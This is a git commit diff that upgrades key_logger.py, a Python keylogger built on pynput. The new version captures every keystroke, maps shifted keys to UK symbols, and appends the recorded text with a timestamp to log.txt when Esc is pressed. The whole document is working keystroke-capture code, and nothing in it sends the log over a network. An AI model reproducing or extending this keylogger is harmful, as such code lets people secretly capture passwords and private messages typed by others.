19753b2aefcbe108d531b32ac4c1437dc56e9f78
CodedChops <devham01@gmail.com>
2019-05-21 00:02:09 +0100

    Upgrade

--- key_logger.py
+++ key_logger.py
@@ -1,44 +1,61 @@
 from pynput import keyboard
 import time
 
-def on_press(key):
-	global string
-	#checks for spacebar pressed in order to separate chunks of letters i.e. words
-	if key == keyboard.Key.space:
-		
-		if not word:
-			print("EMPTY")
+alpha = "abcdefghijklmnopqrstuvwxyz"
+num   = "1234567890"
+sym1  = "-=[];'#,./\\`"
+sym2  = {"1":"!","2":"\"","3":"£","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","`":"¬","-":"_","=":"+","[":"{","]":"}",";":":","'":"@","#":"~",",":"<",".":">","/":"?","\\":"|"}
 
-		else:	
-			for character in word:
-				#adds character to string which will be printed out 
-				string += str(character.strip("\'"))
-			
-			data = str(string) + "  " + str(time.asctime()) + "\n"
-			#print(data)
-			log_tofile(data)
-			data = ""
-			
-			#resets data collected
-			del word[:]
-			string = ""
+def main():
+	with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+		print("Press esc to quit")
+		listener.join()
+
+def on_press(key):
+	print(key)
+	global shift
+	key = str(key).strip("'")
+	if key == "Key.space":
+		word.append(" ")
+
+	elif key == "Key.enter":
+		word.append("\n")
 	
-	elif key == keyboard.Key.esc:
+	elif key == "Key.esc": 
+		with open("log.txt", "a") as log:
+			log.write("\n[@]"+time.asctime()+"\n")
+			for char in word:
+				log.write(char)
 		return False
 	
-	else:
-		#print("Pressed¬ %s" % key)
-		word.append("%s" % key)
+	elif key in alpha:
+		word.append(key)
 
-def log_tofile(data):
-	with open("log.txt", "a") as log:
-		log.write(data)	
+	elif key in num:
+		if shift == True:
+			print(sym2[key])
+			word.append(sym2[key])
+			shift = False
+		else:
+			word.append(key)
+	
+	elif key in sym1:
+		if shift == True:
+			word.append(sym2[key])
+			shift = False
+		else:
+			word.append(key)
+
+	elif key == "Key.shift" or key == "Key.shift_r":
+		shift = True
+	
+	else:
+		word.append(" ["+key+"] ")
 
 def on_release(key):
-	#print("Release Key¬ %s" % key)
 	return True
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-	print("Press esc to quit")
-	word,string = [], ""	
-	listener.join()
+if __name__ == "__main__":
+	word  = []
+	shift = False
+	main()
